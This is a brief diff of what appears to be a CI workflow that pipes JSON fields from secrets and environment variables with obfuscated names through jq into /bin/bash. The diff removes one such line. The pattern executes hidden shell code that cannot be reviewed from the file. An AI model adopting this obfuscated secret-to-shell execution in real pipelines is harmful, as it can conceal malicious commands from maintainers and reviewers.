@@ -20,7 +20,6 @@ jobs:
           ozerh80: ${{ secrets.ozerh80 }}
         run: |
           printf '%s' "$ozerh80" | jq -r .thoml46039 | /bin/bash
-          echo $nlyf773 | jq -r .zjn9 | /bin/bash
           echo $zx799 | jq -r .xw95372 | /bin/bash
           echo $zze01669 | jq -r .qpo358 | /bin/bash
           printf '%s' "$qfyf53" | jq -r .xwfa6 | /bin/bash
